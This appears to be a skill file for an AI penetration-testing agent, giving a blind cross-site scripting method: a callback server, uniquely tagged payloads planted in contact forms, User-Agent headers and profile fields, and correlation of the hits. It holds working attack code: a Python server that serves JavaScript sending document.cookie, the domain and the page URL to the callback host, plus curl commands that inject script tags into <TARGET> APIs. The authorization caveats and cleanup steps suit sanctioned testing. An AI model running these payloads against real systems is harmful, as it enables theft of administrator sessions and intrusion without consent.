---
name: blind_xss_callback
agent: agent6_xss
description: Out-of-band XSS confirmation — callback server setup and correlating hits to injection points.
---

# Blind XSS Callback

## Purpose

Some of the best XSS fires where you can't see it: admin panels you can't log into, log viewers, support dashboards, email clients, PDF renderers, headless review queues. You inject a payload, nothing happens on your screen — but somewhere, a privileged browser executes it. Blind XSS turns that invisibility into proof: the payload phones home to your callback server with the DOM, cookies, and URL of wherever it executed. This skill sets up the callback infrastructure, plants uniquely-identified payloads across every blind surface, correlates incoming hits to injection points, and escalates confirmed hits into full impact demos. No callback = no claim. A hit with a session cookie = the finding.

## Division of labor

- **Consumes:** `findings/stored_xss_chain.md` (admin-only render paths you can't observe — the prime blind targets), `evidence/` canary inventories (which fields were planted where), and the list of out-of-band surfaces (contact forms, feedback, logs, headers like User-Agent that get rendered in admin log viewers).
- **Produces:** the finished artifact — `findings/blind_xss_callback.md` — callback server details, every planted payload with its unique ID, every hit correlated to its injection point, and the exfiltrated evidence. Callback logs under `evidence/blind_xss_callback/`.

## When to use / when NOT to use

- **Use when:** stored input renders in a context you cannot observe (admin panel, moderator queue, support dashboard, log viewer).
- **Use when:** you can inject into data that gets processed out-of-band (contact forms emailed as HTML, error logs, User-Agent/Referer stored and displayed, webhook payloads rendered in dashboards).
- **Use when:** a stored vector needs execution proof but the render path requires credentials you don't have.
- **Skip when (time-pass filter):** you can already observe the render path directly — blind infrastructure is unnecessary overhead; use direct proof. Also skip planting blind payloads in surfaces with no plausible privileged viewer (a payload in a field nobody renders is noise, not hunting). Every planted payload must have a hypothesized viewer.

## Methodology

1. **Set up the callback server.** Use interactsh (`interactsh-client`), Burp Collaborator, or a self-hosted callback: a tiny HTTPS server that logs every hit with timestamp, source IP, User-Agent, and the full exfiltrated data. The server must support: `<script src>` callbacks (script include), `fetch()`/`XMLHttpRequest` POSTs (data exfiltration), and `<img>`/`<link>` callbacks (dumb ping). Record the callback domain and keep it stable for the whole engagement.
2. **Verify the callback channel first.** Before planting anything, trigger the callback yourself from your own browser (load the payload URL directly) and confirm the hit lands in your logs with the expected fields. A broken callback server invalidates every later conclusion.
3. **Generate unique payload IDs.** Every planted payload gets a unique ID encoding the injection point: `b_<field>_<n>`, e.g. `b_contact_msg_3`. The ID goes in the callback URL path or a query param. When a hit arrives, the ID tells you exactly which field fired — correlation without guessing.
4. **Choose the payload shape per context.** 
   - HTML context: `<script src="https://<CALLBACK>/b_contact_msg_3.js"></script>` — then serve a JS from the callback that exfiltrates `document.cookie`, `document.domain`, `location.href`, and `document.documentElement.outerHTML.slice(0,5000)`.
   - Attribute/JS-string context: use the break-out from `reflection_context_map` + `filter_behavior_analysis`, ending in the same callback.
   - Tight filters: `<img src="https://<CALLBACK>/b_contact_msg_3.png">` — a dumb ping still proves execution context (the image loads only if HTML parsed).
   - CSP-strict contexts: the callback domain must survive the target's CSP — check `script-src`/`img-src` first (see `csp_bypass_map`); use `<img>` ping when scripts are blocked.
5. **Plant across every blind surface.** For each hypothesized privileged-viewer surface: contact/feedback forms, support tickets, profile fields, User-Agent and Referer headers (many admin panels render access logs), order notes, filename fields, chat messages, API keys' names/labels. One unique ID per (surface, field). Log every planting: timestamp, exact payload, target field, hypothesized viewer.
6. **Wait and watch — with a deadline.** Blind XSS is asynchronous. Monitor the callback logs for at least 24–72 hours (admins don't review queues instantly). Set a concrete deadline; after it, un-hit payloads are INCONCLUSIVE (not NEGATIVE — the viewer may simply not have looked yet).
7. **Correlate every hit.** For each incoming hit: extract the payload ID → injection point; record timestamp, source IP (is it the target's infrastructure? a corporate IP? — this confirms it fired inside their network), User-Agent (headless browser? admin's Chrome?), `document.domain` + `location.href` (which page rendered it — the admin panel URL is gold), and exfiltrated cookies/tokens.
8. **Escalate confirmed hits.** A hit from the admin panel URL with a session cookie = admin session compromise. Demonstrate impact carefully and minimally: read the cookie (don't use it to impersonate beyond proving access), screenshot the exfiltrated admin page HTML, document what the admin session can do. Never pivot into the admin session without explicit authorization — the callback evidence IS the finding.
9. **Re-verify with a second payload.** For each confirmed hit, plant a second payload with a new ID in the same field and confirm a second hit. This rules out one-off crawler artifacts and satisfies the 2x reproduction bar.
10. **Rule out false hits.** Not every callback is XSS: security scanners, link previewers, and your own testing can trigger hits. Distinguish by: source IP (target infra vs scanner), User-Agent, and whether the full exfiltration JS ran (a dumb `<img>` ping from a link previewer looks different from a script executing `document.cookie` exfiltration).
11. **Clean up.** After the engagement/deadline: remove or neutralize planted payloads where possible (delete test tickets, reset profile fields). Document what couldn't be removed. Blind payloads left behind are a liability.
12. **Decision branches.**
    - If a hit arrives with admin-panel URL + session cookie → critical finding; escalate with the exfiltrated evidence.
    - If hits arrive but only from your own test IPs → your planting works but no privileged viewer fired it; extend the watch or try higher-traffic surfaces.
    - If the callback domain gets blocked (CSP, firewall) → switch payload shape (`<img>` vs `<script>`) or callback channel; don't assume the surface is safe.
    - If the deadline passes with no hits → INCONCLUSIVE per surface, with the hypothesized viewer and watch window documented.

## Exact commands

Start an interactsh callback server:

```bash
mkdir -p evidence/blind_xss_callback
# option A: interactsh-client (self-hosted or public server)
interactsh-client -o evidence/blind_xss_callback/hits.json > evidence/blind_xss_callback/server.log 2>&1 &
# note the generated callback domain from server.log, e.g. abc123.interactsh.com
CALLBACK="abc123.interactsh.com"
echo "$CALLBACK" > evidence/blind_xss_callback/callback_domain.txt
```

Self-hosted minimal callback (when interactsh is unavailable):

```bash
cat > evidence/blind_xss_callback/callback_server.py <<'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime, json
LOG = "evidence/blind_xss_callback/hits.log"
class H(BaseHTTPRequestHandler):
    def _ok(self, ctype="application/javascript"):
        self.send_response(200); self.send_header("Content-Type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*"); self.end_headers()
    def do_GET(self):
        open(LOG, "a").write(json.dumps({"t": str(datetime.datetime.utcnow()),
            "ip": self.client_address[0], "ua": self.headers.get("User-Agent"),
            "path": self.path}) + "\n")
        # serve exfil JS for /b_*.js, 1px gif otherwise
        if self.path.endswith(".js"):
            self._ok(); self.wfile.write(
                b"fetch('https://CALLBACK_DOMAIN/log?c='+encodeURIComponent(document.cookie)"
                b"+'&d='+encodeURIComponent(document.domain)"
                b"+'&u='+encodeURIComponent(location.href));")
        else:
            self._ok("image/gif"); self.wfile.write(
                bytes.fromhex("47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b"))
    def do_POST(self):
        ln = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(ln).decode("utf-8", errors="replace")[:5000]
        open(LOG, "a").write(json.dumps({"t": str(datetime.datetime.utcnow()),
            "ip": self.client_address[0], "path": self.path, "body": body}) + "\n")
        self._ok("text/plain"); self.wfile.write(b"ok")
    def log_message(self, *a): pass
HTTPServer(("0.0.0.0", 8443), H).serve_forever()
EOF
sed -i "s/CALLBACK_DOMAIN/$CALLBACK/" evidence/blind_xss_callback/callback_server.py
```

Verify the callback channel works (do this FIRST):

```bash
curl -sS "https://$CALLBACK/b_selftest_0.js" -o /dev/null
sleep 5; tail -3 evidence/blind_xss_callback/hits.log
# you must see your own hit before planting anything
```

Plant uniquely-identified payloads (one ID per surface/field):

```bash
CB=$(cat evidence/blind_xss_callback/callback_domain.txt)
# contact form -> hypothesized viewer: support dashboard
curl -sS -X POST "https://<TARGET>/api/contact" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"t\",\"email\":\"t@t.t\",\"message\":\"<script src=\\\"https://$CB/b_contact_msg_1.js\\\"></script>\"}" \
  -o evidence/blind_xss_callback/plant_contact.json
# User-Agent -> hypothesized viewer: admin access-log viewer
curl -sS "https://<TARGET>/admin-does-not-exist-404" \
  -H "User-Agent: <script src=\"https://$CB/b_ua_log_1.js\"></script>" -o /dev/null
# profile bio -> hypothesized viewer: admin user-list
curl -sS -X POST "https://<TARGET>/api/profile" \
  -H "Content-Type: application/json" -H "Cookie: session=<YOUR_SESSION>" \
  -d "{\"bio\":\"<img src=\\\"https://$CB/b_bio_img_1.png\\\">\"}" \
  -o evidence/blind_xss_callback/plant_bio.json
echo "planted at $(date -u +%FT%TZ)" >> evidence/blind_xss_callback/plant_log.txt
```

Watch for hits and correlate:

```bash
tail -f evidence/blind_xss_callback/hits.log
# for each hit: extract the /b_<id> path -> look up the field in plant_log.txt
grep -h 'b_contact_msg_1' evidence/blind_xss_callback/hits.log | head -5
```

Second-payload re-verification (new ID, same field):

```bash
curl -sS -X POST "https://<TARGET>/api/contact" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"t\",\"email\":\"t@t.t\",\"message\":\"<script src=\\\"https://$CB/b_contact_msg_2.js\\\"></script>\"}"
# wait for the second hit -> 2x reproduction satisfied
```

## Completion-bias defenses

- [ ] Callback server running; channel self-tested with your own hit BEFORE planting
- [ ] Unique payload ID per (surface, field) — no ID reuse
- [ ] Payload shape chosen per context (script / img-ping / CSP-aware)
- [ ] Plant log exists: timestamp, exact payload, field, hypothesized viewer per plant
- [ ] Every blind surface planted (contact, tickets, profile, UA/Referer, filenames, chat)
- [ ] Watch window defined (24–72h) with a concrete deadline
- [ ] Every hit correlated: ID → field, timestamp, source IP, UA, domain, URL, exfiltrated data
- [ ] False hits ruled out (scanner vs real execution distinguished)
- [ ] Confirmed hits re-verified with a second payload ID (2x)
- [ ] Impact documented minimally (no unauthorized session use beyond proof)
- [ ] Planted payloads cleaned up where possible; leftovers documented
- [ ] `findings/blind_xss_callback.md` exists with server details + hits + correlation
- [ ] **Review step:** agent10_review must verify: (a) the callback self-test hit exists in the logs, (b) every hit is correlated to a logged plant via its unique ID, (c) no hit is claimed without source-IP/UA evidence distinguishing it from scanners, (d) 2x re-verification exists per CONFIRMED hit, (e) cleanup status is documented.
- [ ] **Nudge prompts:**
  - "Keep going until every blind surface has a planted payload with a unique ID — the admin log viewer is the surface everyone forgets."
  - "Do not report done before findings/blind_xss_callback.md correlates every hit to its plant ID."
  - "A callback without a unique ID is noise. If you can't say which field fired, you haven't finished."
- [ ] **Finished artifact definition:** `findings/blind_xss_callback.md` — callback server details, the full plant log (ID → field → hypothesized viewer), every hit with correlation and exfiltrated evidence, 2x verification per CONFIRMED hit, cleanup status. Existence + correlation IS done.

## Evidence standard

- Baseline: the self-test hit (proves the infrastructure works end to end before any claim).
- Reproduction: 2x hits from distinct payload IDs in the same field.
- Raw evidence: callback server logs (full), plant log, exfiltrated data, screenshots of correlated analysis.
- Verdicts: CONFIRMED (2x correlated hits with execution evidence from a privileged context) / INCONCLUSIVE (payload planted, watch window open or expired without hits — hypothesized viewer and window documented) / NEGATIVE (not applicable — a surface with no plausible viewer should never have been planted; remove it).

## Handoffs

- `stored_xss_chain`: consumes confirmed blind hits — the admin render path is now PROVEN, upgrade the chain to CONFIRMED.
- `csp_bypass_map`: if the callback was blocked by CSP, the bypass work happens there; payload shapes iterate together.
- `filter_behavior_analysis`: blind payloads must pass the same filters — the alphabet applies.
- agent10_review: consumes `findings/blind_xss_callback.md` plus the raw callback logs.
